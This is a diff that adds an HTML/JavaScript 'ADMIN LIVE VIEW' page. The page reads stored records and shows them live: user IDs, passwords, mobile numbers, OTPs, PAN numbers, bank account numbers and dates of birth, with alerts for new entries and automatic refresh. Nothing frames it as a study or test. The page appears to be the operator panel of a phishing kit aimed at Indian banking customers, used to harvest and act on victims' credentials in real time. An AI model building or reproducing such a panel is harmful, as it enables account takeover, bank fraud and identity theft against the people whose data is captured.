@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADMIN VIEW</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 10px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 15px;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 15px;
+        }
+        
+        .header h1 {
+            color: #ff0000;
+            font-size: 24px;
+            letter-spacing: 2px;
+        }
+        
+        .status-bar {
+            background: #111;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+        
+        .live-indicator {
+            color: #ff0000;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .data-container {
+            background: #111;
+            border: 1px solid #333;
+            padding: 10px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .data-item {
+            background: #1a1a1a;
+            border: 1px solid #222;
+            margin-bottom: 10px;
+            padding: 12px;
+            border-left: 4px solid #00ff00;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .new-badge {
+            background: #ff0000;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            margin-left: 10px;
+            animation: blink 0.5s infinite;
+        }
+        
+        .data-row {
+            display: flex;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        
+        .data-label {
+            color: #888;
+            min-width: 150px;
+        }
+        
+        .data-value {
+            color: #00ff00;
+            word-break: break-all;
+        }
+        
+        .timestamp {
+            color: #ff9900;
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: right;
+        }
+        
+        .empty-message {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-size: 18px;
+        }
+        
+        .page-indicator {
+            background: #222;
+            padding: 5px 10px;
+            border-radius: 3px;
+            color: #ff9900;
+            font-size: 12px;
+            margin-top: 5px;
+            display: inline-block;
+        }
+        
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🛑 ADMIN LIVE VIEW</h1>
+        <div style="font-size: 12px; color: #888;">Updated: <span id="updateTime">--:--:--</span></div>
+    </div>
+    
+    <div class="status-bar">
+        <div>Total Records: <span id="totalCount">0</span></div>
+        <div>New (Last 1 min): <span id="newCount">0</span></div>
+        <div class="live-indicator">● LIVE</div>
+    </div>
+    
+    <div class="data-container" id="dataContainer">
+        <!-- Data will appear here -->
+        <div class="empty-message">Waiting for data...</div>
+    </div>
+
+    <script>
+        // Auto refresh every 5 seconds
+        let refreshInterval = setInterval(loadData, 5000);
+        
+        // Initial load
+        document.addEventListener('DOMContentLoaded', function() {
+            loadData();
+            updateTime();
+            
+            // Update time every second
+            setInterval(updateTime, 1000);
+        });
+        
+        function loadData() {
+            const allData = JSON.parse(localStorage.getItem('adminData') || '[]');
+            const container = document.getElementById('dataContainer');
+            
+            // Update counts
+            document.getElementById('totalCount').textContent = allData.length;
+            
+            // Count new submissions (last 1 minute)
+            const oneMinuteAgo = new Date().getTime() - 60000;
+            const newSubmissions = allData.filter(item => {
+                const itemTime = new Date(item.timestamp).getTime();
+                return itemTime > oneMinuteAgo;
+            });
+            document.getElementById('newCount').textContent = newSubmissions.length;
+            
+            if (allData.length === 0) {
+                container.innerHTML = '<div class="empty-message">No data yet...</div>';
+                return;
+            }
+            
+            // Sort by timestamp (newest first)
+            const sortedData = [...allData].reverse();
+            
+            let html = '';
+            
+            sortedData.forEach((item, index) => {
+                const itemTime = new Date(item.timestamp);
+                const isNew = (new Date().getTime() - itemTime.getTime()) < 60000; // 1 minute
+                
+                html += `
+                    <div class="data-item" id="item-${index}">
+                        ${isNew ? '<span class="new-badge">NEW</span>' : ''}
+                        <div class="data-row">
+                            <span class="data-label">Time:</span>
+                            <span class="data-value">${formatTime(item.timestamp)}</span>
+                        </div>
+                        <div class="data-row">
+                            <span class="data-label">Page:</span>
+                            <span class="data-value">${item.page || 'Unknown'}</span>
+                        </div>
+                `;
+                
+                // Show different fields based on page type
+                if (item.userId) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">User ID:</span>
+                            <span class="data-value">${item.userId}</span>
+                        </div>
+                    `;
+                }
+                
+                if (item.password) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">Password:</span>
+                            <span class="data-value">${item.password}</span>
+                        </div>
+                    `;
+                }
+                
+                if (item.mobile) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">Mobile:</span>
+                            <span class="data-value">${item.mobile}</span>
+                        </div>
+                    `;
+                }
+                
+                if (item.otp) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">OTP:</span>
+                            <span class="data-value" style="color: #ff9900; font-weight: bold;">${item.otp}</span>
+                        </div>
+                    `;
+                }
+                
+                if (item.panNumber) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">PAN:</span>
+                            <span class="data-value">${item.panNumber}</span>
+                        </div>
+                    `;
+                }
+                
+                if (item.accountNumber) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">Account:</span>
+                            <span class="data-value">${item.accountNumber}</span>
+                        </div>
+                    `;
+                }
+                
+                if (item.dateOfBirth) {
+                    html += `
+                        <div class="data-row">
+                            <span class="data-label">DOB:</span>
+                            <span class="data-value">${item.dateOfBirth}</span>
+                        </div>
+                    `;
+                }
+                
+                // Add page indicator
+                if (item.page) {
+                    html += `<div class="page-indicator">${item.page}</div>`;
+                }
+                
+                html += `
+                        <div class="timestamp">
+                            Received: ${formatFullTime(item.timestamp)}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+            
+            // Highlight new items
+            if (newSubmissions.length > 0) {
+                setTimeout(() => {
+                    newSubmissions.forEach((item, index) => {
+                        const elem = document.getElementById(`item-${sortedData.length - 1 - index}`);
+                        if (elem) {
+                            elem.style.borderLeftColor = '#ff0000';
+                            elem.style.animation = 'none';
+                            setTimeout(() => {
+                                elem.style.animation = 'slideIn 0.5s ease';
+                            }, 10);
+                        }
+                    });
+                }, 100);
+            }
+        }
+        
+        function formatTime(timestamp) {
+            if (!timestamp) return '--:--:--';
+            const date = new Date(timestamp);
+            return date.toLocaleTimeString('en-IN', {
+                hour12: false,
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+        
+        function formatFullTime(timestamp) {
+            if (!timestamp) return 'N/A';
+            const date = new Date(timestamp);
+            return date.toLocaleString('en-IN', {
+                day: '2-digit',
+                month: 'short',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+        
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('updateTime').textContent = 
+                now.toLocaleTimeString('en-IN', {
+                    hour12: false,
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+        }
+        
+        // Auto-refresh page every 30 seconds (fallback)
+        setTimeout(() => {
+            location.reload();
+        }, 30000);
+        
+        // Keyboard shortcut: Ctrl+R to force refresh
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'r') {
+                e.preventDefault();
+                loadData();
+                alert('Manual refresh complete!');
+            }
+        });
+        
+        // Detect if other tabs are adding data
+        window.addEventListener('storage', function(e) {
+            if (e.key === 'adminData') {
+                loadData();
+            }
+        });
+    </script>
+</body>
+</html>
